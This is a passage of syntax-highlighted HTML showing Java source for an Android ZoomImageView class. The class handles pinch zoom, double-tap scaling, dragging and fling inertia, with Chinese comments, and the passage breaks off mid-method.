class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.animation.ObjectAnimator;</span><br><span class="line"><span class="keyword">import</span> android.animation.ValueAnimator;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.graphics.Matrix;</span><br><span class="line"><span class="keyword">import</span> android.graphics.RectF;</span><br><span class="line"><span class="keyword">import</span> android.graphics.drawable.Drawable;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.view.GestureDetector;</span><br><span class="line"><span class="keyword">import</span> android.view.MotionEvent;</span><br><span class="line"><span class="keyword">import</span> android.view.ScaleGestureDetector;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewTreeObserver;</span><br><span class="line"><span class="keyword">import</span> android.view.animation.AccelerateInterpolator;</span><br><span class="line"><span class="keyword">import</span> android.widget.OverScroller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ZoomImageView</span> <span class="keyword">extends</span> <span class="title">androidx</span>.<span class="title">appcompat</span>.<span class="title">widget</span>.<span class="title">AppCompatImageView</span> <span class="keyword">implements</span> <span class="title">ViewTreeObserver</span>.<span class="title">OnGlobalLayoutListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> mIsOneLoad = <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">//初始化的比例,也就是最小比例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> mInitScale;</span><br><span class="line">    <span class="comment">//图片最大比例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> mMaxScale;</span><br><span class="line">    <span class="comment">//双击能达到的最大比例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> mMidScale;</span><br><span class="line">    <span class="keyword">private</span> Matrix mScaleMatrix;</span><br><span class="line">    <span class="comment">//捕获用户多点触控</span></span><br><span class="line">    <span class="keyword">private</span> ScaleGestureDetector mScaleGestureDetector;</span><br><span class="line">    <span class="comment">//移动</span></span><br><span class="line">    <span class="keyword">private</span> GestureDetector gestureDetector;</span><br><span class="line">    <span class="comment">//双击</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isEnlarge = <span class="keyword">false</span>;<span class="comment">//是否放大</span></span><br><span class="line">    <span class="keyword">private</span> ValueAnimator mAnimator; <span class="comment">//双击缩放动画</span></span><br><span class="line">    <span class="comment">// 滚动</span></span><br><span class="line">    <span class="keyword">private</span> OverScroller scroller;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> mCurrentX, mCurrentY;</span><br><span class="line">    <span class="keyword">private</span> ValueAnimator translationAnimation; <span class="comment">//惯性移动动画</span></span><br><span class="line">    <span class="comment">//单击</span></span><br><span class="line">    <span class="keyword">private</span> OnClickListener onClickListener;<span class="comment">//单击监听</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZoomImageView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(context, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZoomImageView</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(context, attrs, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ZoomImageView</span><span class="params">(Context context, AttributeSet attrs, <span class="keyword">int</span> defStyleAttr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">        <span class="comment">//记住，一定要把ScaleType设置成ScaleType.MATRIX，否则无法缩放</span></span><br><span class="line">        setScaleType(ScaleType.MATRIX);</span><br><span class="line">        scroller = <span class="keyword">new</span> OverScroller(context);</span><br><span class="line">        mScaleMatrix = <span class="keyword">new</span> Matrix();</span><br><span class="line">        <span class="comment">//手势缩放</span></span><br><span class="line">        mScaleGestureDetector = <span class="keyword">new</span> ScaleGestureDetector(context, <span class="keyword">new</span> ScaleGestureDetector.SimpleOnScaleGestureListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onScale</span><span class="params">(ScaleGestureDetector detector)</span> </span>&#123;</span><br><span class="line">                scale(detector);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onScaleEnd</span><span class="params">(ScaleGestureDetector detector)</span> </span>&#123;</span><br><span class="line">                scaleEnd(detector);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//滑动和双击监听</span></span><br><span class="line">        gestureDetector = <span class="keyword">new</span> GestureDetector(context, <span class="keyword">new</span> GestureDetector.SimpleOnGestureListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onScroll</span><span class="params">(MotionEvent e1, MotionEvent e2, <span class="keyword">final</span> <span class="keyword">float</span> distanceX, <span class="keyword">final</span> <span class="keyword">float</span> distanceY)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//滑动监听</span></span><br><span class="line">                onTranslationImage(-distanceX, -distanceY);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onDoubleTap</span><span class="params">(MotionEvent e)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//双击监听</span></span><br><span class="line">                onDoubleDrowScale(e.getX(), e.getY());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onFling</span><span class="params">(MotionEvent e1, MotionEvent e2, <span class="keyword">float</span> velocityX, <span class="keyword">float</span> velocityY)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//滑动惯性处理</span></span><br><span class="line">                mCurrentX = (<span class="keyword">int</span>) e2.getX();</span><br><span class="line">                mCurrentY = (<span class="keyword">int</span>) e2.getY();</span><br><span class="line">                RectF rectF = getMatrixRectF();</span><br><span class="line">                <span class="keyword">if</span> (rectF == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//startX为当前图片左边界的x坐标</span></span><br><span class="line">                <span class="keyword">int</span> startX = mCurrentX;</span><br><span class="line">                <span class="keyword">int</span> startY = mCurrentY;</span><br><span class="line">                <span class="keyword">int</span> minX = <span class="number">0</span>, maxX = <span class="number">0</span>, minY = <span class="number">0</span>, maxY = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> vX = Math.round(velocityX);</span><br><span class="line">                <span class="keyword">int</span> vY = Math.round(velocityY);</span><br><span class="line">                maxX = Math.round(rectF.width());</span><br><span class="line">                maxY = Math.round(rectF.height());</span><br><span class="line">                <span class="keyword">if</span> (startX != maxX || startY != maxY) &#123;</span><br><span class="line">                    <span class="comment">//调用fling方法，然后我们可以通过调用getCurX和getCurY来获得当前的x和y坐标</span></span><br><span class="line">                    <span class="comment">//这个坐标的计算是模拟一个惯性滑动来计算出来的，我们根据这个x和y的变化可以模拟</span></span><br><span class="line">                    <span class="comment">//出图片的惯性滑动</span></span><br><span class="line">                    scroller.fling(startX, startY, vX, vY, <span class="number">0</span>, maxX, <span class="number">0</span>, maxY, maxX, maxY);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (translationAnimation != <span class="keyword">null</span> &amp;&amp; translationAnimation.isStarted())</span><br><span class="line">                    translationAnimation.end();</span><br><span class="line">                translationAnimation = ObjectAnimator.ofFloat(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">                translationAnimation.setDuration(<span class="number">500</span>);</span><br><span class="line">                translationAnimation.addUpdateListener(<span class="keyword">new</span> ValueAnimator.AnimatorUpdateListener() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationUpdate</span><span class="params">(ValueAnimator animation)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (scroller.computeScrollOffset()) &#123;</span><br><span class="line">                            <span class="comment">//获得当前的x坐标</span></span><br><span class="line">                            <span class="keyword">int</span> newX = scroller.getCurrX();</span><br><span class="line">                            <span class="keyword">int</span> dx = newX - mCurrentX;</span><br><span class="line">                            mCurrentX = newX;</span><br><span class="line">                            <span class="comment">//获得当前的y坐标</span></span><br><span class="line">                            <span class="keyword">int</span> newY = scroller.getCurrY();</span><br><span class="line">                            <span class="keyword">int</span> dy = newY - mCurrentY;</span><br><span class="line">                            mCurrentY = newY;</span><br><span class="line">                            <span class="comment">//进行平移操作</span></span><br><span class="line">                            <span class="keyword">if</span> (dx != <span class="number">0</span> &amp;&amp; dy != <span class="number">0</span>)</span><br><span class="line">                                onTranslationImage(dx, dy);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">                translationAnimation.start();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.onFling(e1, e2, velocityX, velocityY);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onSingleTapConfirmed</span><span class="params">(MotionEvent e)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//单击事件</span></span><br><span class="line">                <span class="keyword">if</span>(onClickListener != <span class="keyword">null</span>)</span><br><span class="line">                    onClickListener.onClick(ZoomImageView.<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOnClickListener</span><span class="params">(OnClickListener onClickListener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.onClickListener = onClickListener;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onAttachedToWindow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onAttachedToWindow();</span><br><span class="line">        getViewTreeObserver().addOnGlobalLayoutListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDetachedFromWindow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDetachedFromWindow();</span><br><span class="line">        getViewTreeObserver().removeOnGlobalLayoutListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * imageView加载完成后调用，获取imageView加载完成后的图片大小</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onGlobalLayout</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mIsOneLoad) &#123;</span><br><span class="line">            <span class="comment">//得到控件的宽和高</span></span><br><span class="line">            <span class="keyword">int</span> width = getWidth();</span><br><span class="line">            <span class="keyword">int</span> height = getHeight();</span><br><span class="line">            <span class="comment">//获取图片,如果没有图片则直接退出</span></span><br><span class="line">            Drawable d = getDrawable();</span><br><span class="line">            <span class="keyword">if</span> (d == <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">//获取图片的宽和高</span></span><br><span class="line">            <span class="keyword">int</span> dw = d.getIntrinsicWidth();</span><br><span class="line">            <span class="keyword">int</span> dh = d.getIntrinsicHeight();</span><br><span class="line">            <span class="keyword">float</span> scale = <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">if</span> (dw &gt; width &amp;&amp; dh &lt;= height) &#123;</span><br><span class="line">                scale = width * <span class="number">1.0f</span> / dw;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (dw &lt;= width &amp;&amp; dh &gt; height) &#123;</span><br><span class="line">                scale = height * <span class="number">1.0f</span> / dh;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((dw &lt;= width &amp;&amp; dh &lt;= height) || (dw &gt;= width &amp;&amp; dh &gt;= height)) &#123;</span><br><span class="line">                scale = Math.min(width * <span class="number">1.0f</span> / dw, height * <span class="number">1.0f</span> / dh);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//图片原始比例，图片回复原始大小时使用</span></span><br><span class="line">            mInitScale = scale;</span><br><span class="line">            <span class="comment">//图片双击后放大的比例</span></span><br><span class="line">            mMidScale = mInitScale * <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//手势放大时最大比例</span></span><br><span class="line">            mMaxScale = mInitScale * <span class="number">4</span>;</span><br><span class="line">            <span class="comment">//设置移动数据,把改变比例后的图片移到中心点</span></span><br><span class="line">            <span class="keyword">float</span> translationX = width * <span class="number">1.0f</span> / <span class="number">2</span> - dw / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">float</span> translationY = height * <span class="number">1.0f</span> / <span class="number">2</span> - dh / <span class="number">2</span>;</span><br><span class="line">            mScaleMatrix.postTranslate(translationX, translationY);</span><br><span class="line">            mScaleMatrix.postScale(mInitScale, mInitScale, width * <span class="number">1.0f</span> / <span class="number">2</span>, height * <span class="number">1.0f</span> / <span class="number">2</span>);</span><br><span class="line">            setImageMatrix(mScaleMatrix);</span><br><span class="line">            mIsOneLoad = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTouchEvent</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mScaleGestureDetector.onTouchEvent(event)|</span><br><span class="line">                gestureDetector.onTouchEvent(event);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//手势操作（缩放）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scale</span><span class="params">(ScaleGestureDetector detector)</span> </span>&#123;</span><br><span class="line">        Drawable drawable = getDrawable();</span><br><span class="line">        <span class="keyword">if</span> (drawable == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">float</span> scale = getScale();</span><br><span class="line">        <span class="comment">//获取手势操作的值,scaleFactor&gt;1说明放大，&lt;1则说明缩小</span></span><br><span class="line">        <span class="keyword">float</span> scaleFactor = detector.getScaleFactor();</span><br><span class="line">        <span class="comment">//获取手势操作后的比例，当放操作后比例在[mInitScale,mMaxScale]区间时允许放大</span></span><br><span class="line">        mScaleMatrix.postScale(scaleFactor, scaleFactor, detector.getFocusX(), detector.getFocusY());</span><br><span class="line">        setImageMatrix(mScaleMatrix);</span><br><span class="line">        removeBorderAndTranslationCenter();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//手势操作结束</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scaleEnd</span><span class="params">(ScaleGestureDetector detector)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">float</span> scale = getScale();</span><br><span class="line">        scale = detector.getScaleFactor() * scale;</span><br><span class="line">        <span class="keyword">if</span> (scale &lt; mInitScale) &#123;</span><br><span class="line">            scaleAnimation(mInitScale, getWidth() / <span class="number">2</span>, getHeight() / <span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (scale &gt; mMaxScale) &#123;</span><br><span class="line">            scaleAnimation(mMaxScale, getWidth() / <span class="number">2</span>, getHeight() / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//手势操作（移动）</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">onTranslationImage</span><span class="params">(<span class="keyword">float</span> dx, <span class="keyword">float</span> dy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getDrawable() == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        RectF rect = getMatrixRectF();</span><br><span class="line">        <span class="comment">//图片宽度小于控件宽度时不允许左右移动</span></span><br><span class="line">        <span class="keyword">if</span> (rect.width() &lt;= getWidth())</span><br><span class="line">            dx = <span class="number">0.0f</span>;</span><br><span class="line">        <span class="comment">//图片高度小于控件宽度时，不允许上下移动</span></span><br><span class="line">        <span class="keyword">if</span> (rect.height() &lt;= getHeight())</span><br><span class="line">            dy = <span class="number">0.0f</span>;</span><br><span class="line">        <span class="comment">//移动距离等于0，那就不需要移动了</span></span><br><span class="line">        <span class="keyword">if</span> (dx == <span class="number">0.0f</span> &amp;&amp; dy == <span class="number">0.0f</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        mScaleMatrix.postTranslate(dx, dy);</span><br><span class="line">        setImageMatrix(mScaleMatrix);</span><br><span class="line">        <span class="comment">//去除移动边界</span></span><br><span class="line">        removeBorderAndTranslationCenter();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//消除控件边界和把图片移动到中间</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">removeBorderAndTranslationCenter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RectF rectF = getMatrixRectF();</span><br><span class="line">        <span class="keyword">if</span> (rectF == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> width = getWidth();</span><br><span class="line">        <span class="keyword">int</span> height = getHeight();</span><br><span class="line">        <span class="keyword">float</span> widthF = rectF.width();</span><br><span class="line">        <span class="keyword">float</span> heightF = rectF.height();</span><br><span class="line">        <span class="keyword">float</span> left = rectF.left;</span><br><span class="line">        <span class="keyword">float</span> right = rectF.right;</span><br><span class="line">        <span class="keyword">float</span> top = rectF.top;</span><br><span class="line">        <span class="keyword">float</span> bottom = rectF.bottom;</span><br><span class="line">        <span class="keyword">float</span> translationX = <span class="number">0.0f</span>, translationY = <span class="number">0.0f</span>;</span><br><span class="line">        <span class="keyword">if</span> (left &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//左边有边界</span></span><br><span class="line">            <span class="keyword">if</span> (widthF &gt; width) &#123;</span><br><span class="line">                <span class="comment">//图片宽度大于控件宽度，移动到左边贴边</span></span><br><span class="line">                translationX = -left;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//图片宽度小于控件宽度，移动到中间</span></span><br><span class="line">                translationX = width * <span class="number">1.0f</span> / <span class="number">2f</span> - (widthF * <span class="number">1.0f</span> / <span class="number">2f</span> + left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (right &lt; width) &#123;</span><br><span class="line">            <span class="comment">//右边有边界</span></span><br><span class="line">            <span class="keyword">if</span> (widthF &gt; width) &#123;</span><br><span class="line">                <span class="comment">//图片宽度大于控件宽度，移动到右边贴边</span></span><br><span class="line">                translationX = width - right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//图片宽度小于控件宽度，移动到中间</span></span><br><span class="line">                translationX = width * <span class="number">1.0f</span> / <span class="number">2f</span> - (widthF * <span class="number">1.0f</span> / <span class="number">2f</span> + left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (top &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//顶部有边界</span></span><br><span class="line">            <span class="keyword">if</span> (heightF &gt; height) &#123;</span><br><span class="line">                <span class="comment">//图片高度大于控件高度，去除顶部边界</span></span><br><span class="line">                translationY = -top;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//图片高度小于控件宽度，移动到中间</span></span><br><span class="line">                translationY = height * <span class="number">1.0f</span> / <span class="number">2f</span> - (top + heightF * <span class="number">1.0f</span> / <span class="number">2f</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bottom &lt; height) &#123;</span><br><span class="line">            <span class="comment">//底部有边界</span></span><br><span class="line">            <span class="keyword">if</span> (heightF &gt; height) 